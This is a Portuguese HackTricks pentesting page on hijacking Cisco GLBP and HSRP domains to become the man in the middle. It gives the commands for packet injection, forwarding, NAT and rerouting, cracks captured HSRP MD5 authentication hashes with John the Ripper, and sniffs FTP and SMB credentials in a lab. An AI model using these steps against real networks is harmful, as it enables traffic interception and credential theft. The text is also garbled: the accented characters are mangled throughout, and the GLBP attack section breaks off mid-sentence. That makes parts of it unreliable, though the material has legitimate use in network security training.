# Ataques GLBP e HSRP

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

**Esta p√°gina foi copiada de** [**https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9**](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)\*\*\*\*

## Sequestro FHRP <a href="#6196" id="6196"></a>

### O que √© FHRP? <a href="#b12d" id="b12d"></a>

FHRP (Protocolo de Redund√¢ncia do Primeiro Salto) √© uma classe de protocolos de rede projetados para criar um sistema de roteamento redundante. Com o FHRP, roteadores f√≠sicos podem ser combinados em um √∫nico dispositivo l√≥gico, o que aumenta a toler√¢ncia a falhas e ajuda a distribuir a carga.

**Os engenheiros da Cisco Systems desenvolveram dois protocolos FHRP, GLBP e HSRP, que demonstrarei a seguir.**

### Protocolo GLBP <a href="#8a26" id="8a26"></a>

**Desenvolvido pelos engenheiros da Cisco Systems.** Como o HSRP, este protocolo √© implementado no topo da pilha de protocolos TCP/IP, por isso √© usado o protocolo de camada de transporte UDP sob o n√∫mero de porta 3222 para a tradu√ß√£o de informa√ß√µes de servi√ßo. Os roteadores GLBP dentro do mesmo grupo l√≥gico trocam pacotes "hello" especiais a cada 3 segundos, mas se um roteador GLBP dentro do mesmo grupo n√£o receber um pacote hello de seu vizinho GLBP dentro de 10 segundos, ele o reconhece como "morto". No entanto, os valores do temporizador podem ser configurados dependendo das necessidades do administrador.

### A estrutura e mec√¢nica do GLBP <a href="#3bb3" id="3bb3"></a>

O GLBP fornece compartilhamento de carga para v√°rios roteadores (gateways) usando um √∫nico endere√ßo IP virtual e v√°rios endere√ßos MAC virtuais. Cada host √© configurado com o mesmo endere√ßo IP virtual e todos os roteadores no grupo virtual participam da transmiss√£o de pacotes.

Funciona de maneira muito diferente dos protocolos HSRP e VRRP porque usa verdadeiros mecanismos de balanceamento de carga, que descreverei abaixo:

**Dependente do Host.** Um tipo de balanceamento de carga usado em uma rede onde h√° NAT. O Dependente do Host garante que o host receber√° de volta o mesmo endere√ßo MAC do dispositivo AVF que foi usado em um momento anterior, assim a NAT configurada para o host n√£o ser√° quebrada.

**Round-Robin.** Neste modo, o dispositivo AVG distribui endere√ßos MAC para os membros AVF alternadamente. Este √© o mecanismo usado por padr√£o.

**Round-robin baseado em peso**. Balanceamento de carga baseado em uma m√©trica especial "Peso".

### Fun√ß√µes no dom√≠nio GLBP e Terminologia <a href="#febd" id="febd"></a>

**AVG (Gateway Virtual Ativo)** - o roteador com o papel principal √© tamb√©m respons√°vel por distribuir endere√ßos MAC para outros roteadores dentro do mesmo grupo GLBP. Uma esp√©cie de "chefe" no dom√≠nio GLBP. O AVG informa aos outros roteadores como distribuir o tr√°fego, fornecendo endere√ßos MAC quando uma solicita√ß√£o ARP chega. Vale ressaltar que s√≥ pode haver um roteador AVG em um dom√≠nio GLBP, mas ele tamb√©m pode ser um membro AVF.

**AVF (Encaminhador Virtual Ativo)** - um roteador em um grupo GLBP que lida com o tr√°fego na rede.

**Prioridade GLBP** - O valor de prioridade que determina qual roteador no grupo GLBP ser√° o AVG. O valor padr√£o √© 100 (a faixa de prioridade pode ser de 1 a 255). Pode ser definido manualmente, ou seja, o engenheiro de rede determina qual roteador ser√° o "superior" e qual ser√° o "escravo". Quanto maior a prioridade, maior a probabilidade de o roteador obter o papel de AVG. Normalmente, o papel de AVG √© dado a roteadores mais poderosos.

**Peso GLBP** - O valor do chamado Peso GLBP de um roteador em um grupo GLBP. O Peso GLBP define o n√≠vel de carga do roteador. Este valor √© "flutuante" e pode variar dependendo da carga no canal f√≠sico (o mecanismo de Rastreamento de Objetos est√° envolvido), mas tamb√©m pode ser configurado manualmente.

**Endere√ßo IP virtual GLBP** - o endere√ßo IP virtual no dom√≠nio GLBP. Usado como endere√ßo de gateway padr√£o para hosts leg√≠timos.

O GLBP usa o endere√ßo IP de envio de grupo reservado **224.0.0.102** e o n√∫mero de porta do protocolo de camada de transporte UDP **3222** para enviar e processar informa√ß√µes de servi√ßo. Pacotes GLBP Hello especiais s√£o enviados a cada **3 segundos**. Se o roteador GLBP n√£o receber um pacote hello de um vizinho dentro de **10 segundos**, o vizinho ser√° considerado "morto" e sair√° do dom√≠nio GLBP.

### Mecanismo de ataque GLBP <a href="#3260" id="3260"></a>

A t√©cnica deste ataque de rede √© impor seu dispositivo como o roteador principal **injetando um pacote GLBP malicioso com um valor de prioridade m√°ximo.** **A explora√ß√£o bem-sucedida leva a um ataque DoS ou MITM no qual voc√™ pode interceptar o tr√°fego dentro da rede, conduzir um redirecionamento ou causar um DoS ao
```
~$ sudo ip link set eth0 promisc on
~$ sudo sysctl -w net.ipv4.ip_forward=1
```
Selecione o roteador com endere√ßo IP **10.10.100.100** e ative a op√ß√£o **Obter IP**. Voc√™ tamb√©m precisa gerar um **ARP Gratuito**.

<figure><img src="../../.gitbook/assets/image (222).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (161) (2).png" alt=""><figcaption><p>A estrutura de uma inje√ß√£o maliciosa GLBP</p></figcaption></figure>

Como voc√™ pode ver, o roteador AVG agora est√° fingindo ser um sistema atacante. **O valor de prioridade √© 255, o valor de peso √© 255, ou seja, o m√°ximo.**

**Ap√≥s realizar a inje√ß√£o, precisamos criar um endere√ßo IP secund√°rio em nossa interface de rede com o valor do endere√ßo IP virtual no dom√≠nio GLBP. Voc√™ tamb√©m precisa definir uma m√°scara de 24 bits.**

**Dessa forma, o tr√°fego leg√≠timo ser√° redirecionado de volta para n√≥s, porque o endere√ßo IP virtual usado no dom√≠nio GLBP √© o endere√ßo do gateway padr√£o para hosts:**
```
~$ sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
```
Para ver n√£o apenas o tr√°fego de entrada, mas tamb√©m o tr√°fego de sa√≠da, precisamos de uma pequena regra para **SNAT (masquerading):**
```
~$ sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```
Tamb√©m precisamos remover a rota padr√£o em nossa m√°quina e escrever uma nova que passar√° pelo antigo roteador AVG (o endere√ßo √© 10.10.100.100). Mesmo que tenhamos sequestrado o papel do AVG do roteador, ele ainda poder√° rotear o tr√°fego.
```
~$ sudo route del default
~$ sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
√â isso, **agora somos o "homem do meio"!** Vou executar a ferramenta [**net-creds.py**](https://github.com/DanMcInerney/net-creds) para analisar o tr√°fego em busca de dados importantes. **Por exemplo, tr√°fego FTP n√£o criptografado ou hashes NTLM.**
```
~$ sudo python2 net-creds.py -i eth0
```
Depois de executar a ferramenta, tentarei ler a compartilhamento SMB com o endere√ßo IP **172.16.100.70**, que est√° atr√°s dos roteadores GLBP.
```
user@Boundless:~$ smbclient -L \\172.16.100.70 --user mercy
```
<figure><img src="../../.gitbook/assets/image (243).png" alt=""><figcaption></figcaption></figure>

**Assim √© como voc√™ pode interceptar o tr√°fego dentro da rede atacando dom√≠nios GLBP.**

### Sequestro de HSRP <a href="#595f" id="595f"></a>

**HSRP (Hot Standby Router/Redundancy Protocol) ‚Äî** √© um protocolo propriet√°rio da Cisco que permite a redund√¢ncia do gateway de rede. A ideia geral √© combinar v√°rios roteadores f√≠sicos em um roteador l√≥gico com um endere√ßo IP comum. Este endere√ßo do roteador virtual ser√° atribu√≠do √† interface do roteador com a fun√ß√£o de mestre, e este, por sua vez, cuidar√° do encaminhamento do tr√°fego. No dom√≠nio HSRP, a tarefa de lidar com todo o tr√°fego recai precisamente sobre o roteador com a fun√ß√£o prim√°ria, ao contr√°rio do GLBP, onde foi proposto o balanceamento de carga usando m√©tricas especiais (prioridade e peso).

### Fun√ß√µes no dom√≠nio HSRP e terminologia <a href="#4185" id="4185"></a>

**Roteador Ativo HSRP** ‚Äî um dispositivo que age como um roteador virtual e fornece o encaminhamento do tr√°fego de redes de origem para redes de destino.\
**Roteador Standby HSRP** ‚Äî um dispositivo que age como um roteador standby, aguardando a falha do roteador ativo. Quando o roteador ativo prim√°rio falha, o roteador standby assumir√° o papel prim√°rio e assumir√° as fun√ß√µes do roteador ativo.\
**Grupo HSRP** ‚Äî um grupo de dispositivos que garante a opera√ß√£o e toler√¢ncia a falhas de um roteador l√≥gico.\
**Endere√ßo MAC HSRP** ‚Äî o endere√ßo MAC virtual do roteador l√≥gico no dom√≠nio HSRP.\
**Endere√ßo IP Virtual HSRP** ‚Äî Este √© um endere√ßo IP virtual especial no grupo HSRP. Este endere√ßo IP ser√° o gateway padr√£o para os hosts finais, usado no pr√≥prio roteador l√≥gico.

### Vers√µes do protocolo HSRP <a href="#eda3" id="eda3"></a>

O protocolo HSRP tem duas vers√µes ‚Äî HSRPv1 e HSRPv2. Eles diferem nos seguintes par√¢metros:

* **O n√∫mero de grupos l√≥gicos poss√≠veis.** HSRPv1 pode ter at√© 255 grupos. HSRPv2 pode ter at√© 4096 grupos.
* **Endere√ßo IP multicast.** HSRPv1 usa o endere√ßo IP **224.0.0.2** para enviar informa√ß√µes de servi√ßo, e HSRPv2 usa **224.0.0.102**.
* **Endere√ßo MAC virtual.** HSRPv1 usa **00:00:0C:07:AC:XX** como seu endere√ßo MAC virtual. HSRPv2 tem um endere√ßo MAC virtual de **00:00:0C:9F:FX:XX** (onde XX √© o n√∫mero do grupo HSRP)

HSRP usa o endere√ßo IP reservado **224.0.0.2** ou **224.0.0.102** (dependendo da vers√£o do HSRP) e o protocolo de camada de transporte UDP com o n√∫mero de porta **1985** para transmitir e processar as informa√ß√µes de servi√ßo. Pacotes HSRP Hello especiais s√£o enviados **a cada 3 segundos.** Se o roteador HSRP n√£o receber um pacote hello de um vizinho **dentro de 10 segundos**, o vizinho ser√° considerado "morto" e sair√° do dom√≠nio HSRP.

### Mecanismo de ataque HSRP <a href="#d4a3" id="d4a3"></a>

**Este √© exatamente o mesmo que o Sequestro GLBP. Precisamos realizar uma inje√ß√£o maliciosa de HSRP com um valor de prioridade m√°xima de 255.** Isso nos permite sequestrar o papel do roteador ativo, abrindo a porta para um ataque **MITM**. Mas novamente, precisamos examinar as seguintes informa√ß√µes antes de realizar o ataque:

* **O endere√ßo IP virtual usado no dom√≠nio HSRP**
* **A presen√ßa de autentica√ß√£o**
* **Valor das prioridades do roteador**

Podemos extrair essas informa√ß√µes analisando o tr√°fego HSRP. **Vamos usar o Wireshark.**

Como voc√™ pode ver na captura de tela, o processo HSRP envolve apenas dois roteadores com os endere√ßos 10.10.100.100 e 10.10.100.200

<figure><img src="../../.gitbook/assets/image (181).png" alt=""><figcaption><p>An√∫ncios HSRP</p></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (212).png" alt=""><figcaption><p>Primeiro roteador HSRP</p></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (304).png" alt=""><figcaption><p>Segundo roteador HSRP</p></figcaption></figure>

Com base na an√°lise do tr√°fego HSRP, temos o seguinte:

* **Foi detectada uma configura√ß√£o incorreta dentro da configura√ß√£o de prioridade. O roteador ativo √© considerado um roteador HSRP com prioridade 200, ou seja, temos um vetor para o sequestro HSRP**
* **o endere√ßo IP virtual usado no dom√≠nio HSRP √© 10.10.100.254**
* **A autentica√ß√£o MD5 √© usada**

Ter autentica√ß√£o no dom√≠nio amarra nossas m√£os, mas eu vou consertar isso.

### Bypass de autentica√ß√£o HSRP <a href="#d9fd" id="d9fd"></a>

Salve o dump de tr√°fego HSRP no formato **.pcap**, para que o exfiltrador possa extrair corretamente as hashes MD5 do dump. Vou usar o **hsrp2john.py** como exfiltrador:
```
~/cisconightmare/exfiltrate$ python2 hsrp2john.py hsrp_with_authentication.pcap
```
<figure><img src="../../.gitbook/assets/image (287).png" alt=""><figcaption><p>Hashes MD5 extra√≠das do dump de tr√°fego HSRP</p></figcaption></figure>

Vou quebrar as hashes com o **John the Ripper**, especificando as pr√≥prias hashes como entrada. E com o par√¢metro **--wordlist** vou especificar o caminho para o dicion√°rio:
```
~/cisconightmare/exfiltrate$ john hsrp_hashes --wordlist=wordlistforbrute
```
<figure><img src="../../.gitbook/assets/image (203).png" alt=""><figcaption><p>Senha do dom√≠nio HSRP quebrada</p></figcaption></figure>

Como resultado, temos uma chave para entrar no dom√≠nio HSRP - **endgame**.

### Inje√ß√£o HSRP (Loki) <a href="#6a2b" id="6a2b"></a>

Usarei o mesmo Loki para atacar o protocolo HSRP. Entre outras coisas, ele possui uma fun√ß√£o de inje√ß√£o de chave, que nos ajuda a contornar a autentica√ß√£o. Anteriormente, na se√ß√£o de sequestro HSRP, obtivemos todas as informa√ß√µes necess√°rias sobre o dom√≠nio HSRP.

Iniciando o Loki.

<figure><img src="../../.gitbook/assets/image (309).png" alt=""><figcaption><p>Loki detectou an√∫ncios HSRP</p></figcaption></figure>

N√£o se esque√ßa de mudar para o modo prom√≠scuo e permitir o roteamento de tr√°fego antes de realizar o ataque:
```
~$ sudo ip link set eth0 promisc on
~$ sudo sysctl -w net.ipv4.ip_forward=1
```
Selecione o roteador com o endere√ßo **10.10.100.100** e uma prioridade de **200**. Como par√¢metro **Secret**, **insira a senha quebrada** do dom√≠nio HSRP, gere um ARP Gratuito e selecione a op√ß√£o **Get IP**.

<figure><img src="../../.gitbook/assets/image (192).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (237).png" alt=""><figcaption></figcaption></figure>

**Como podemos ver, o roteador ativo agora √© o nosso sistema de ataque. O valor de prioridade √© 255.**

**Ap√≥s a inje√ß√£o, precisamos criar um endere√ßo IP secund√°rio em nossa interface de rede com o valor do endere√ßo IP virtual no dom√≠nio HSRP. Voc√™ tamb√©m deve especificar uma m√°scara de 24 bits. Dessa forma, o tr√°fego leg√≠timo ser√° redirecionado para n√≥s, porque o endere√ßo IP virtual usado no dom√≠nio HSRP √© o endere√ßo do gateway padr√£o para os hosts.**
```
~$ sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
```
N√≥s configuramos o conhecido NAT de origem (masquerading) para interceptar todo o tr√°fego:
```
~$ sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```
N√≥s removemos a rota padr√£o da nossa m√°quina e escrevemos uma nova rota que passar√° pelo antigo roteador Ativo (cujo endere√ßo √© 10.10.100.100). Mesmo que tenhamos sequestrado o papel ativo do roteador, ele ainda ser√° capaz de rotear o tr√°fego.
```
~$ sudo route del default
~$ sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
Agora somos o "homem do meio". Vamos executar o **net-creds.py**:
```
~$ sudo python2 net-creds.py -i eth0
```
Depois de executar a ferramenta, vou reproduzir uma tentativa de autentica√ß√£o no servidor FTP em 172.16.100.140:
```
~$ ftp 172.16.100.140
```
<figure><img src="../../.gitbook/assets/image (179).png" alt=""><figcaption></figcaption></figure>

Como resultado, obtemos credenciais do servidor FTP: **insomnia:betrayal**

Assim √© poss√≠vel atacar o dom√≠nio HSRP e interceptar o tr√°fego. Basicamente, tudo √© semelhante ao GLBP.

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
